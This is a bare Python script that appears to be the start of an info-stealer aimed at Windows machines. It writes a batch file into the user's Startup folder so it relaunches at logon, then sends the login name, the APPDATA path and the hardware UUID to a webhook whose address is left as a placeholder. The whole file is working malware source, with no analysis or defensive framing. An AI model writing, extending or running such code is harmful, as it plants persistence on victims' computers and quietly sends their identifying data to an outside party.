import requests, os, subprocess, sys

h00kMa0n = 'your webhook'

def ats():
    requests.post(h00kMa0n, json={"content": "Adding to startup"})
    startup_folder = os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup"
    script_path = os.path.abspath(sys.argv[0])
    with open(os.path.join(startup_folder, "startup_script.bat"), 'w') as f:
        f.write(f'@echo off\n"{sys.executable}" "{script_path}"\n')

def get_crd():
    requests.post(h00kMa0n, json={'content': f"```PC Name: {os.getlogin()}```"})
    requests.post(h00kMa0n, json={'content': f"```AppData: {os.getenv('APPDATA')}```"})
    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().splitlines()
    uuid = [line.strip() for line in hwid if line.strip() and "UUID" not in line][0]
    requests.post(h00kMa0n, json={'content': f"```HWID: {uuid}```"})

ats()
get_crd()
